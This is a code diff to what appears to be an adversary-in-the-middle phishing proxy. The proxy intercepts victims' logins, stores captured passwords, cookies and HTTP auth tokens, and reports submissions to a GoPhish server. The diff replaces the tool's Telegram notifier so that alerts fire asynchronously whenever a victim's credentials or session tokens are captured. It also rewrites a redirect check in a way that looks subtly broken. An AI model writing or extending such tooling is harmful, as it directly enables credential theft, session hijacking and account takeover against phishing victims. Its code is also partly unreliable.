@@ -70,7 +70,6 @@ type HttpProxy struct {
 	db                *database.Database
 	bl                *Blacklist
 	gophish           *GoPhish
-	telegramNotifier  *TelegramNotifier
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -83,6 +82,7 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+	telegram         *TelegramClient
 }
 
 type ProxySession struct {
@@ -116,7 +116,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		db:                db,
 		bl:                bl,
 		gophish:           NewGoPhish(),
-		telegramNotifier:  NewTelegramNotifier(cfg.GetTelegramBotToken(), cfg.GetTelegramChatIDs()),
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -147,6 +146,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.sids = make(map[string]int)
 
 	p.Proxy.Verbose = false
+	p.telegram = NewTelegramClient()
+	p.telegram.Configure(cfg.GetTelegramBotToken(), cfg.GetTelegramChatIDs(), cfg.GetTelegramEnabled())
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
 		req.URL.Scheme = "https"
@@ -1047,7 +1048,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			if is_cookie_auth && is_body_auth && is_http_auth {
+if is_cookie_auth && is_body_auth && is_http_auth {
 				// we have all auth tokens
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
@@ -1062,18 +1063,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
 							log.Error("database: %v", err)
 						}
-
-						// Trigger Telegram notification asynchronously
-						go func() {
-							dbSession, err := p.db.GetSession(ps.SessionId)
-							if err != nil {
-								log.Error("telegram: failed to retrieve session from database: %v", err)
-								return
-							}
-							p.telegramNotifier.SendSessionNotification(dbSession)
-						}()
-
 						s.Finish(false)
+
+						if !s.TokensTelegramNotified {
+							s.TokensTelegramNotified = true
+							go p.telegram.NotifyTokensCaptured(s, s.Name)
+						}
 
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 							rid, ok := s.Params["rid"]
@@ -1081,7 +1076,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
 								err = p.gophish.ReportCredentialsSubmitted(rid, s.RemoteAddr, s.UserAgent)
 								if err != nil {
-									log.Error("gophish: %s", err)
+									log.Error("gophish: %v", err)
 								}
 							}
 						}
@@ -1215,6 +1210,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
 							}
 
+							if !s.TokensTelegramNotified {
+								s.TokensTelegramNotified = true
+								go p.telegram.NotifyTokensCaptured(s, s.Name)
+							}
+
 							if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 								rid, ok := s.Params["rid"]
 								if ok && rid != "" {
@@ -1239,7 +1239,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
 					if s.RedirectURL != "" && s.RedirectCount == 0 {
-						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && (strings.Index(string(body), "</head>") >= 0 || strings.Index(string(body), "</body>") >= 0) {
+						if stringExists(mime, []string{"text/html"}) && resp.StatusCode == 200 && len(body) > 0 && stringExists(string(body), []string{"<head>", "<body>"}) {
 							// redirect only if received response content is of `text/html` content type
 							s.RedirectCount += 1
 							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
@@ -1598,6 +1598,10 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetPassword(password)
+		if s.Username != "" && !s.TelegramNotified {
+			s.TelegramNotified = true
+			go p.telegram.NotifySessionCaptured(s, s.Name)
+		}
 	}
 }
 
